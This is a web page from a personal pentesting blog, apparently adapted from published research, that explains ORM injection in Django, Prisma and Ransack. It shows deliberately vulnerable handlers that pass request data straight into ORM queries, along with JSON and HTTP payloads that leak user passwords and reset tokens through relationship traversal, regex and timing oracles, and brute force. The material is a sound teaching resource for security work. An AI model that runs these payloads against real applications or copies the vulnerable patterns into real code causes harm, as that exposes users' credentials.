<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> ORM Injection | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/projects/pentesting-web/2025-01-01-orm-injection/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">h0m3 </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item active"> <a class="nav-link" href="/projects/">projects <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item "> <a class="nav-link" href="/teaching/">teaching </a> </li> <li class="nav-item "> <a class="nav-link" href="/people/">people </a> </li> <li class="nav-item "> <a class="nav-link" href="/hacking/">hacking </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item " href="/publications/">publications</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/projects/">projects</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">ORM Injection</h1> <p class="post-description"></p> </header> <article> <h1 id="orm-injection">ORM Injection</h1> <h2 id="django-orm-python">Django ORM (Python)</h2> <p>In <a href="https://www.elttam.com/blog/plormbing-your-django-orm/" rel="external nofollow noopener" target="_blank"><strong>this post</strong></a> is explained how it’s possible to make a Django ORM vulnerable by using for example a code like:</p> <pre class="language-python"><code class="lang-python">class ArticleView(APIView):
    """
        Some basic API view that users send requests to for
        searching for articles
    """
    def post(self, request: Request, format=None):
        try:
<strong>            articles = Article.objects.filter(**request.data)
</strong>            serializer = ArticleSerializer(articles, many=True)
        except Exception as e:
            return Response([])
        return Response(serializer.data)
</code></pre> <p>Note how all the request.data (which will be a json) is directly passed to <strong>filter objects from the database</strong>. An attacker could send unexpected filters in order to leak more data than expected from it.</p> <p>Examples:</p> <ul> <li> <strong>Login:</strong> In a simple login try to leak the passwords of the users registered inside of it.</li> </ul> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"admin"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"password_startswith"</span><span class="p">:</span><span class="w"> </span><span class="s2">"a"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div> <blockquote> <p>[!CAUTION] It’s possible to brute-force the password until it’s leaked.</p> </blockquote> <ul> <li> <strong>Relational filtering</strong>: It’s possible to traverse relations in order to leak information from columns that weren’t even expected to be used in the operation. For example, if it’s possible to leak articles created by a user withe these relations: Article(<code class="language-plaintext highlighter-rouge">created_by</code>) -[1..1]-&gt; Author (<code class="language-plaintext highlighter-rouge">user</code>) -[1..1]-&gt; User(<code class="language-plaintext highlighter-rouge">password</code>).</li> </ul> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"created_by__user__password__contains"</span><span class="p">:</span><span class="w"> </span><span class="s2">"pass"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div> <blockquote> <p>[!CAUTION] It’s possible to find the password of all the users that have created an article</p> </blockquote> <ul> <li> <strong>Many-to-many relational filtering</strong>: In the previous example we couldn’t find passwords of users that haven’t created an article. However, following other relationships this is possible. For example: Article(<code class="language-plaintext highlighter-rouge">created_by</code>) -[1..1]-&gt; Author(<code class="language-plaintext highlighter-rouge">departments</code>) -[0..*]-&gt; Department(<code class="language-plaintext highlighter-rouge">employees</code>) -[0..*]-&gt; Author(<code class="language-plaintext highlighter-rouge">user</code>) -[1..1]-&gt; User(<code class="language-plaintext highlighter-rouge">password</code>).</li> </ul> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"created_by__departments__employees__user_startswith"</span><span class="p">:</span><span class="w"> </span><span class="s2">"admi"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div> <blockquote> <p>[!CAUTION] In this case we can find all the users in the departments of users that have created articles and then leak their passwords (in the previous json we are just leaking the usernames but then it’s possible to leak the passwords).</p> </blockquote> <ul> <li> <strong>Abusing Django Group and Permission many-to-may relations with users</strong>: Moreover, the AbstractUser model is used to generate users in Django and by default this model has some <strong>many-to-many relationships with the Permission and Group tables</strong>. Which basically is a default way to <strong>access other users from one user</strong> if they are in the <strong>same group or share the same permission</strong>.</li> </ul> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># By users in the same group</span>
created_by__user__groups__user__password

<span class="c"># By users with the same permission</span>
created_by__user__user_permissions__user__password
</code></pre></div></div> <ul> <li> <strong>Bypass filter restrictions</strong>: The same blogpost proposed to bypass the use of some filtering like <code class="language-plaintext highlighter-rouge">articles = Article.objects.filter(is_secret=False, **request.data)</code>. t’s possible to dump articles that have is_secret=True because we can loop back from a relationship to the Article table and leak secret articles from non secret articles because the results are joined and the is_secret field is checked in the non secret article while the data is leaked from the secret article.</li> </ul> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Article.objects.filter<span class="o">(</span><span class="nv">is_secret</span><span class="o">=</span>False, <span class="nv">categories__articles__id</span><span class="o">=</span>2<span class="o">)</span>
</code></pre></div></div> <blockquote> <p>[!CAUTION] Abusing relationships it’s possible to bypass even filters meant to protect the data shown.</p> </blockquote> <ul> <li> <strong>Error/Time based via ReDoS</strong>: In the previous examples it was expected to have different responses if the filtering worked or not to use that as oracle. But it could be possible that some action is done in the database and the response is always the same. In this scenario it could be possible to make the database error to get a new oracle.</li> </ul> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">//</span><span class="w"> </span><span class="err">Non</span><span class="w"> </span><span class="err">matching</span><span class="w"> </span><span class="err">password</span><span class="w">
</span><span class="p">{</span><span class="w">
    </span><span class="nl">"created_by__user__password__regex"</span><span class="p">:</span><span class="w"> </span><span class="s2">"^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="err">//</span><span class="w"> </span><span class="err">ReDoS</span><span class="w"> </span><span class="err">matching</span><span class="w"> </span><span class="err">password</span><span class="w"> </span><span class="err">(will</span><span class="w"> </span><span class="err">show</span><span class="w"> </span><span class="err">some</span><span class="w"> </span><span class="err">error</span><span class="w"> </span><span class="err">in</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">response</span><span class="w"> </span><span class="err">or</span><span class="w"> </span><span class="err">check</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">time)</span><span class="w">
</span><span class="p">{</span><span class="nl">"created_by__user__password__regex"</span><span class="p">:</span><span class="w"> </span><span class="s2">"^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"</span><span class="p">}</span><span class="w">
</span></code></pre></div></div> <p>From te same post regarding this vector:</p> <ul> <li> <strong>SQLite</strong>: Doesn’t have a regexp operator by default (require loading a third-party extension)</li> <li> <strong>PostgreSQL</strong>: Doesn’t have a default regex timeout and it’s less prone to backtracking</li> <li> <strong>MariaDB</strong>: Doesn’t have a regex timeout</li> </ul> <h2 id="prisma-orm-nodejs">Prisma ORM (NodeJS)</h2> <p>The following are <a href="https://www.elttam.com/blog/plorming-your-primsa-orm/" rel="external nofollow noopener" target="_blank"><strong>tricks extracted from this post</strong></a>.</p> <ul> <li> <strong>Full find contro</strong>l:</li> </ul> <pre class="language-javascript"><code class="lang-javascript">const app = express();

app.use(express.json());

app.post('/articles/verybad', async (req, res) =&gt; {
    try {
        // Attacker has full control of all prisma options
<strong>        const posts = await prisma.article.findMany(req.body.filter)
</strong>        res.json(posts);
    } catch (error) {
        res.json([]);
    }
});
</code></pre> <p>It’s possible to see that the whole javascript body is passed to prisma to perform queries.</p> <p>In the example from the original post, this would check all the posts createdBy someone (each post is created by someone) returning also the user info of that someone (username, password…)</p> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"filter"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"include"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"createdBy"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="err">//</span><span class="w"> </span><span class="err">Response</span><span class="w">
</span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
        </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
        </span><span class="nl">"title"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Buy Our Essential Oils"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"body"</span><span class="p">:</span><span class="w"> </span><span class="s2">"They are very healthy to drink"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"published"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
        </span><span class="nl">"createdById"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
        </span><span class="nl">"createdBy"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"karen@example.com"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
            </span><span class="nl">"isAdmin"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"karen"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"super secret passphrase"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"resetToken"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2eed5e80da4b7491"</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="err">...</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></code></pre></div></div> <p>The following one selects all the posts created by someone with a password and wil return the password:</p> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"filter"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"select"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"createdBy"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="nl">"select"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                    </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
                </span><span class="p">}</span><span class="w">
            </span><span class="p">}</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="err">//</span><span class="w"> </span><span class="err">Response</span><span class="w">
</span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
        </span><span class="nl">"createdBy"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"super secret passphrase"</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="err">...</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></code></pre></div></div> <ul> <li> <strong>Full where clause control</strong>:</li> </ul> <p>Let’s take a look to this where the attack can control the <code class="language-plaintext highlighter-rouge">where</code> clause:</p> <pre class="language-javascript"><code class="lang-javascript">app.get('/articles', async (req, res) =&gt; {
    try {
        const posts = await prisma.article.findMany({
<strong>            where: req.query.filter as any // Vulnerable to ORM Leaks
</strong>        })
        res.json(posts);
    } catch (error) {
        res.json([]);
    }
});
</code></pre> <p>It’s possible to filter the password of users directly like:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">await</span> <span class="nx">prisma</span><span class="p">.</span><span class="nx">article</span><span class="p">.</span><span class="nf">findMany</span><span class="p">({</span>
  <span class="na">where</span><span class="p">:</span> <span class="p">{</span>
    <span class="na">createdBy</span><span class="p">:</span> <span class="p">{</span>
      <span class="na">password</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">startsWith</span><span class="p">:</span> <span class="dl">"</span><span class="s2">pas</span><span class="dl">"</span><span class="p">,</span>
      <span class="p">},</span>
    <span class="p">},</span>
  <span class="p">},</span>
<span class="p">});</span>
</code></pre></div></div> <blockquote> <p>[!CAUTION] Using operations like <code class="language-plaintext highlighter-rouge">startsWith</code> it’s possible to leak information.</p> </blockquote> <ul> <li><strong>Many-to-many relational filtering bypassing filtering:</strong></li> </ul> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/articles</span><span class="dl">"</span><span class="p">,</span> <span class="k">async </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="k">try</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">query</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">query</span><span class="p">;</span>
    <span class="nx">query</span><span class="p">.</span><span class="nx">published</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">posts</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">prisma</span><span class="p">.</span><span class="nx">article</span><span class="p">.</span><span class="nf">findMany</span><span class="p">({</span> <span class="na">where</span><span class="p">:</span> <span class="nx">query</span> <span class="p">});</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">(</span><span class="nx">posts</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">([]);</span>
  <span class="p">}</span>
<span class="p">});</span>
</code></pre></div></div> <p>It’s possible to leak not published articles by lopping back to the many-to-many relationships between <code class="language-plaintext highlighter-rouge">Category</code> -[*..*]-&gt; <code class="language-plaintext highlighter-rouge">Article</code>:</p> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"query"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"categories"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="nl">"some"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"articles"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="nl">"some"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"published"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="nl">"{articleFieldToLeak}"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
              </span><span class="nl">"startsWith"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{testStartsWith}"</span><span class="w">
            </span><span class="p">}</span><span class="w">
          </span><span class="p">}</span><span class="w">
        </span><span class="p">}</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div> <p>It’s also possible to leak all the users abusing some loop back many-to-many relationships:</p> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"query"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"createdBy"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="nl">"departments"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"some"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="nl">"employees"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"some"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
              </span><span class="nl">"departments"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="nl">"some"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                  </span><span class="nl">"employees"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                    </span><span class="nl">"some"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                      </span><span class="nl">"departments"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                        </span><span class="nl">"some"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                          </span><span class="nl">"employees"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                            </span><span class="nl">"some"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                              </span><span class="nl">"{fieldToLeak}"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                                </span><span class="nl">"startsWith"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{testStartsWith}"</span><span class="w">
                              </span><span class="p">}</span><span class="w">
                            </span><span class="p">}</span><span class="w">
                          </span><span class="p">}</span><span class="w">
                        </span><span class="p">}</span><span class="w">
                      </span><span class="p">}</span><span class="w">
                    </span><span class="p">}</span><span class="w">
                  </span><span class="p">}</span><span class="w">
                </span><span class="p">}</span><span class="w">
              </span><span class="p">}</span><span class="w">
            </span><span class="p">}</span><span class="w">
          </span><span class="p">}</span><span class="w">
        </span><span class="p">}</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div> <ul> <li> <strong>Error/Timed queries</strong>: In the original post you can read an very extensive set of tests performed in order to find the optimal payload to leak information with a time based payload. This is:</li> </ul> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"OR"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"NOT"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="err">ORM_LEAK</span><span class="p">}</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="err">CONTAINS_LIST</span><span class="p">}</span><span class="w">
    </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div> <p>Where the <code class="language-plaintext highlighter-rouge">{CONTAINS_LIST}</code> is a list with 1000 strings to make sure the <strong>response is delayed when the correct leak is found.</strong></p> <h2 id="ransack-ruby"><strong>Ransack (Ruby)</strong></h2> <p>These tricks where <a href="https://positive.security/blog/ransack-data-exfiltration" rel="external nofollow noopener" target="_blank"><strong>found in this post</strong></a><strong>.</strong></p> <blockquote> <p>[!TIP] &gt; <strong>Note that Ransack 4.0.0.0 now enforce the use of explicit allow list for searchable attributes and associations.</strong></p> </blockquote> <p><strong>Vulnerable example:</strong></p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">index</span>
  <span class="vi">@q</span> <span class="o">=</span> <span class="no">Post</span><span class="p">.</span><span class="nf">ransack</span><span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="ss">:q</span><span class="p">])</span>
  <span class="vi">@posts</span> <span class="o">=</span> <span class="vi">@q</span><span class="p">.</span><span class="nf">result</span><span class="p">(</span><span class="ss">distinct: </span><span class="kp">true</span><span class="p">)</span>
<span class="k">end</span>
</code></pre></div></div> <p>Note how the query will be defined by the parameters sent by the attacker. It was possible to for example brute-force the reset token with:</p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">GET /posts?q[user_reset_password_token_start]=0
GET /posts?q[user_reset_password_token_start]=1
...
</span></code></pre></div></div> <p>By brute-forcing and potentially relationships it was possible to leak more data from a database.</p> <h2 id="references">References</h2> <ul> <li><a href="https://www.elttam.com/blog/plormbing-your-django-orm/" rel="external nofollow noopener" target="_blank">https://www.elttam.com/blog/plormbing-your-django-orm/</a></li> <li><a href="https://www.elttam.com/blog/plorming-your-primsa-orm/" rel="external nofollow noopener" target="_blank">https://www.elttam.com/blog/plorming-your-primsa-orm/</a></li> <li><a href="https://positive.security/blog/ransack-data-exfiltration" rel="external nofollow noopener" target="_blank">https://positive.security/blog/ransack-data-exfiltration</a></li> </ul> </article> </div> </div> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>